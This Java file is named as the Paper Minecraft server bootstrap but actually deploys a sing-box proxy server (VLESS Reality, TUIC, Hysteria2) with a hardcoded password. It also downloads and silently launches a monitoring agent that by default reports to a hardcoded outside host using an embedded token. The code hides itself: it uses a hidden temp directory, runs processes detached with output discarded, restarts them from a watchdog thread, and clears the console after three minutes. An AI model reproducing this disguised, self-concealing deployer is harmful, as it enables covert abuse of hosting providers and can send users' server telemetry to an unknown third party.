package io.papermc.paper;

import org.yaml.snakeyaml.Yaml;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.*;

public class PaperBootstrap {

    // ========== 全局变量（类级别）==========
    private static final Path UUID_FILE = Paths.get("data/uuid.txt");
    private static String uuid;
    private static Process singboxProcess;
    // ===== Komari 相关全局变量 =====
    private static volatile Process komariProcess; // 存储Komari进程（volatile保证多线程可见性）
    private static final AtomicBoolean running = new AtomicBoolean(true); // 控制守护线程运行
    // ======================================

    public static void main(String[] args) {
        try {
            System.out.println("config.yml 加载中...");
            Map<String, Object> config = loadConfig();

            // ---------- UUID 自动生成 & 持久化 ----------
            uuid = generateOrLoadUUID(config.get("uuid"));
            System.out.println("当前使用的 UUID: " + uuid);
            // --------------------------------------------

            // ===== sing-box 配置读取 =====
            String tuicPort = trim((String) config.get("tuic_port"));
            String hy2Port = trim((String) config.get("hy2_port"));
            String realityPort = trim((String) config.get("reality_port"));
            String sni = (String) config.getOrDefault("sni", "www.bing.com");

            boolean deployVLESS = !realityPort.isEmpty();
            boolean deployTUIC = !tuicPort.isEmpty();
            boolean deployHY2 = !hy2Port.isEmpty();

            if (!deployVLESS && !deployTUIC && !deployHY2)
                throw new RuntimeException("❌ 未设置任何协议端口！");

            Path baseDir = Paths.get("/tmp/.singbox");
            Files.createDirectories(baseDir);
            Path configJson = baseDir.resolve("config.json"); // 变量名是configJson
            Path cert = baseDir.resolve("cert.pem");
            Path key = baseDir.resolve("private.key");
            Path bin = baseDir.resolve("sing-box");
            Path realityKeyFile = Paths.get("reality.key");

            System.out.println("✅ config.yml 加载成功");

            // ===== sing-box 核心逻辑 =====
            generateSelfSignedCert(cert, key);
            String version = fetchLatestSingBoxVersion();
            safeDownloadSingBox(version, bin, baseDir);

            // === 固定 Reality 密钥 ===
            String privateKey = "";
            String publicKey = "";
            if (deployVLESS) {
                if (Files.exists(realityKeyFile)) {
                    List<String> lines = Files.readAllLines(realityKeyFile);
                    for (String line : lines) {
                        if (line.startsWith("PrivateKey:")) privateKey = line.split(":", 2)[1].trim();
                        if (line.startsWith("PublicKey:")) publicKey = line.split(":", 2)[1].trim();
                    }
                    System.out.println("🔑 已加载本地 Reality 密钥对（固定公钥）");
                } else {
                    Map<String, String> keys = generateRealityKeypair(bin);
                    privateKey = keys.getOrDefault("private_key", "");
                    publicKey = keys.getOrDefault("public_key", "");
                    Files.writeString(realityKeyFile,
                            "PrivateKey: " + privateKey + "\nPublicKey: " + publicKey + "\n");
                    System.out.println("✅ Reality 密钥已保存到 reality.key");
                }
            }
            generateSingBoxConfig(configJson, uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, cert, key,
                    privateKey, publicKey);

            // 启动sing-box（移除定时重启调用）
            singboxProcess = startSingBox(bin, configJson);

            // ===== Komari Agent 核心逻辑 =====
            runKomariAgent(config); // 启动Komari
            startKomariDaemonThread(config); // 启动Komari守护线程

            // ===== 输出节点 =====
            String host = detectPublicIP();
            printDeployedLinks(uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, host, publicKey);

            // ===== 核心修改：清屏时机延后（当前设为3分钟=180秒，可自定义）=====
            scheduleConsoleClear(180); // 数字代表秒数，比如：30=30秒，60=1分钟，300=5分钟，600=10分钟

            // ===== 关闭钩子：清理资源 + 停止进程 =====
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                try {
                    // 停止Komari进程
                    if (komariProcess != null && komariProcess.isAlive()) {
                        komariProcess.destroy();
                        System.out.println("❌ Komari Agent 进程已终止");
                    }
                    // 停止sing-box进程
                    if (singboxProcess != null && singboxProcess.isAlive()) {
                        singboxProcess.destroy();
                        System.out.println("❌ sing-box 进程已终止");
                    }
                    // 删除临时目录
                    deleteDirectory(baseDir);
                } catch (Exception ignored) {}
            }));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== 极简清屏：仅保留核心跨平台清屏逻辑 ==========
    /**
     * 延迟指定秒数后清理控制台日志（最简单实现）
     * @param delaySeconds 延迟秒数，可自定义：30=30秒，60=1分钟，180=3分钟，300=5分钟，600=10分钟
     */
    private static void scheduleConsoleClear(int delaySeconds) {
        Executors.newSingleThreadScheduledExecutor().schedule(() -> {
            clearConsole();
        }, delaySeconds, TimeUnit.SECONDS);
    }

    /**
     * 跨平台清理控制台日志（核心命令，无冗余）
     */
    private static void clearConsole() {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            // 执行对应系统的清屏命令
            ProcessBuilder pb = os.contains("win") 
                ? new ProcessBuilder("cmd", "/c", "cls") 
                : new ProcessBuilder("clear");
            pb.inheritIO().start().waitFor();
        } catch (Exception e) {
            // 清屏失败仅提示，不影响主程序
            System.out.println("清理控制台日志失败：" + e.getMessage());
        }
    }

    // ========== Komari Agent 核心方法 ==========
    private static void runKomariAgent(Map<String, Object> config) throws Exception {
        // 从config.yml读取Komari配置
        String komariE = trim((String) config.getOrDefault("komari_e", "https://vps.z1000.dpdns.org:10736"));
        String komariT = trim((String) config.getOrDefault("komari_t", "JzerczYfCF4Secuy9vtYaB"));
        String komariUrlAmd64 = trim((String) config.getOrDefault("komari_amd64_url",
                "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64"));
        String komariUrlArm64 = trim((String) config.getOrDefault("komari_arm64_url",
                "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64"));
        String komariFileName = trim((String) config.getOrDefault("komari_file_name", "sbx_komari"));

        // 获取Komari二进制文件路径
        Path agentPath = getKomariAgentPath(komariUrlAmd64, komariUrlArm64, komariFileName);

        // 启动Komari（隐藏日志）
        List<String> command = new ArrayList<>();
        command.add("setsid");
        command.add(agentPath.toString());
        command.add("-e");
        command.add(komariE);
        command.add("-t");
        command.add(komariT);

        ProcessBuilder pb = new ProcessBuilder(command);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
        pb.directory(new File(System.getProperty("user.dir")));

        komariProcess = pb.start();
        System.out.println("\n✅ Komari Agent 启动成功（配置：e=" + komariE + ", t=" + komariT + "）");
    }

    private static Path getKomariAgentPath(String komariUrlAmd64, String komariUrlArm64, String komariFileName) throws IOException {
        String arch = detectArch();
        String url = arch.equals("amd64") ? komariUrlAmd64 : komariUrlArm64;
        Path agentPath = Paths.get(System.getProperty("java.io.tmpdir"), komariFileName);

        if (Files.exists(agentPath)) {
            return agentPath;
        }

        // 下载Komari二进制文件
        System.out.println("\n⬇️ 下载Komari Agent: " + url);
        try (InputStream in = new URL(url).openStream()) {
            Files.copy(in, agentPath, StandardCopyOption.REPLACE_EXISTING);
        }

        // 设置可执行权限
        if (!agentPath.toFile().setExecutable(true)) {
            throw new IOException("❌ 无法设置Komari Agent可执行权限");
        }

        System.out.println("✅ Komari Agent 下载并授权完成");
        return agentPath;
    }

    private static void startKomariDaemonThread(Map<String, Object> config) {
        Thread daemonThread = new Thread(() -> {
            while (running.get()) {
                try {
                    // 检测Komari进程是否存活
                    if (komariProcess == null || !komariProcess.isAlive()) {
                        System.err.println("\n❌ Komari Agent 进程意外退出，正在重启...");
                        runKomariAgent(config);
                    }
                    Thread.sleep(5000); // 每5秒检测一次
                } catch (Exception e) {
                    System.err.println("❌ 重启Komari Agent失败: " + e.getMessage());
                }
            }
        });
        daemonThread.setDaemon(true);
        daemonThread.setName("KomariAgentDaemon");
        daemonThread.start();
        System.out.println("✅ Komari Agent 守护线程已启动（每5秒检测一次进程状态）");
    }

    // ========== 原有核心方法（保留）==========
    private static String generateOrLoadUUID(Object configUuid) {
        // 1. 优先使用 config.yml
        String cfg = trim((String) configUuid);
        if (!cfg.isEmpty()) {
            saveUuidToFile(cfg);
            return cfg;
        }

        // 2. 读取本地持久化文件
        try {
            if (Files.exists(UUID_FILE)) {
                String saved = Files.readString(UUID_FILE).trim();
                if (isValidUUID(saved)) {
                    System.out.println("已加载持久化 UUID: " + saved);
                    return saved;
                }
            }
        } catch (Exception e) {
            System.err.println("读取 UUID 文件失败: " + e.getMessage());
        }

        // 3. 首次生成
        String newUuid = UUID.randomUUID().toString();
        saveUuidToFile(newUuid);
        System.out.println("首次生成 UUID: " + newUuid);
        return newUuid;
    }

    private static void saveUuidToFile(String uuid) {
        try {
            Files.createDirectories(UUID_FILE.getParent());
            Files.writeString(UUID_FILE, uuid);
            UUID_FILE.toFile().setReadable(false, false);
            UUID_FILE.toFile().setReadable(true, true);
        } catch (Exception e) {
            System.err.println("保存 UUID 失败: " + e.getMessage());
        }
    }

    private static boolean isValidUUID(String u) {
        return u != null && u.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$");
    }

    private static String trim(String s) {
        return s == null ? "" : s.trim();
    }

    private static Map<String, Object> loadConfig() throws IOException {
        Yaml yaml = new Yaml();
        Path configPath = Paths.get("config.yml");
        if (!Files.exists(configPath)) {
            Files.createFile(configPath);
            System.out.println("⚠️ config.yml 文件不存在，已创建空文件");
            return new HashMap<>();
        }
        try (InputStream in = Files.newInputStream(configPath)) {
            Object o = yaml.load(in);
            if (o instanceof Map) return (Map<String, Object>) o;
            return new HashMap<>();
        }
    }

    private static void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
        if (Files.exists(cert) && Files.exists(key)) {
            System.out.println("🔑 证书已存在，跳过生成");
            return;
        }
        System.out.println("🔨 正在生成 EC 自签证书...");
        new ProcessBuilder("bash", "-c",
                "openssl ecparam -genkey -name prime256v1 -out " + key + " && " +
                        "openssl req -new -x509 -days 3650 -key " + key + " -out " + cert + " -subj '/CN=bing.com'")
                .inheritIO().start().waitFor();
        System.out.println("✅ 已生成自签证书");
    }

    private static Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
        System.out.println("🔑 正在生成 Reality 密钥对...");
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", bin + " generate reality-keypair");
        pb.redirectErrorStream(true);
        Process p = pb.start();
        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
        }
        p.waitFor();
        String out = sb.toString();
        Matcher priv = Pattern.compile("PrivateKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        Matcher pub = Pattern.compile("PublicKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        if (!priv.find() || !pub.find()) throw new IOException("Reality 密钥生成失败：" + out);
        Map<String, String> map = new HashMap<>();
        map.put("private_key", priv.group(1));
        map.put("public_key", pub.group(1));
        System.out.println("✅ Reality 密钥生成完成");
        return map;
    }

    private static void generateSingBoxConfig(Path configFile, String uuid, boolean vless, boolean tuic, boolean hy2,
                                              String tuicPort, String hy2Port, String realityPort,
                                              String sni, Path cert, Path key,
                                              String privateKey, String publicKey) throws IOException {

        List<String> inbounds = new ArrayList<>();

        if (tuic) {
            inbounds.add("""
              {
                "type": "tuic",
                "listen": "::",
                "listen_port": %s,
                "users": [{"uuid": "%s", "password": "eishare2025"}],
                "congestion_control": "bbr",
                "tls": {
                  "enabled": true,
                  "alpn": ["h3"],
                  "certificate_path": "%s",
                  "key_path": "%s"
                }
              }
            """.formatted(tuicPort, uuid, cert, key));
        }

        if (hy2) {
            inbounds.add("""
              {
                "type": "hysteria2",
                "listen": "::",
                "listen_port": %s,
                "users": [{"password": "%s"}],
                "masquerade": "https://bing.com",
                "ignore_client_bandwidth": true,
                "up_mbps": 1000,
                "down_mbps": 1000,
                "tls": {
                  "enabled": true,
                  "alpn": ["h3"],
                  "insecure": true,
                  "certificate_path": "%s",
                  "key_path": "%s"
                }
              }
            """.formatted(hy2Port, uuid, cert, key));
        }

        if (vless) {
            inbounds.add("""
              {
                "type": "vless",
                "listen": "::",
                "listen_port": %s,
                "users": [{"uuid": "%s", "flow": "xtls-rprx-vision"}],
                "tls": {
                  "enabled": true,
                  "server_name": "%s",
                  "reality": {
                    "enabled": true,
                    "handshake": {"server": "%s", "server_port": 443},
                    "private_key": "%s",
                    "short_id": [""]
                  }
                }
              }
            """.formatted(realityPort, uuid, sni, sni, privateKey));
        }

        String json = """
        {
          "log": { "level": "info" },
          "inbounds": [%s],
          "outbounds": [{"type": "direct"}]
        }
        """.formatted(String.join(",", inbounds));

        Files.writeString(configFile, json);
        System.out.println("✅ sing-box 配置生成完成");
    }

    private static String fetchLatestSingBoxVersion() {
        String fallback = "1.12.12";
        try {
            URL url = new URL("https://api.github.com/repos/SagerNet/sing-box/releases/latest");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Accept", "application/vnd.github.v3+json");
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().reduce("", (a, b) -> a + b);
                int i = json.indexOf("\"tag_name\":\"v");
                if (i != -1) {
                    String v = json.substring(i + 13, json.indexOf("\"", i + 13));
                    System.out.println("🔍 最新版本: " + v);
                    return v;
                }
            }
        } catch (Exception e) {
            System.out.println("⚠️ 获取版本失败，使用回退版本 " + fallback);
        }
        return fallback;
    }

    private static void safeDownloadSingBox(String version, Path bin, Path dir) throws IOException, InterruptedException {
        if (Files.exists(bin)) return;
        String arch = detectArch();
        String file = "sing-box-" + version + "-linux-" + arch + ".tar.gz";
        String url = "https://github.com/SagerNet/sing-box/releases/download/v" + version + "/" + file;

        System.out.println("⬇️ 下载 sing-box: " + url);
        Path tar = dir.resolve(file);
        new ProcessBuilder("bash", "-c", "curl -L -o " + tar + " \"" + url + "\"").inheritIO().start().waitFor();
        new ProcessBuilder("bash", "-c",
                "cd " + dir + " && tar -xzf " + file + " 2>/dev/null || true && " +
                        "(find . -type f -name 'sing-box' -exec mv {} ./sing-box \\; ) && chmod +x sing-box || true")
                .inheritIO().start().waitFor();

        if (!Files.exists(bin)) throw new IOException("未找到 sing-box 可执行文件！");
        System.out.println("✅ 成功解压 sing-box 可执行文件");
    }

    private static String detectArch() {
        String a = System.getProperty("os.arch").toLowerCase();
        if (a.contains("aarch") || a.contains("arm")) return "arm64";
        return "amd64";
    }

    private static Process startSingBox(Path bin, Path cfg) throws IOException, InterruptedException {
        System.out.println("正在启动 sing-box...");
        ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
        Process p = pb.start();
        Thread.sleep(1500);
        System.out.println("sing-box 已启动，PID: " + p.pid());
        return p;
    }

    private static String detectPublicIP() {
        try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org").openStream()))) {
            return br.readLine();
        } catch (Exception e) {
            return "your-server-ip";
        }
    }

    private static void printDeployedLinks(String uuid, boolean vless, boolean tuic, boolean hy2,
                                           String tuicPort, String hy2Port, String realityPort,
                                           String sni, String host, String publicKey) {
        System.out.println("\n=== ✅ 已部署节点链接 ===");
        if (vless)
            System.out.printf("VLESS Reality:\nvless://%s@%s:%s?encryption=none&flow=xtls-rprx-vision&security=reality&sni=%s&fp=chrome&pbk=%s#Reality\n",
                    uuid, host, realityPort, sni, publicKey);
        if (tuic)
            System.out.printf("\nTUIC:\ntuic://%s:eishare2025@%s:%s?sni=%s&alpn=h3&congestion_control=bbr&allowInsecure=1#TUIC\n",
                    uuid, host, tuicPort, sni);
        if (hy2)
            System.out.printf("\nHysteria2:\nhysteria2://%s@%s:%s?sni=%s&insecure=1#Hysteria2\n",
                    uuid, host, hy2Port, sni);
    }

    private static void deleteDirectory(Path dir) throws IOException {
        if (!Files.exists(dir)) return;
        Files.walk(dir).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
    }
}
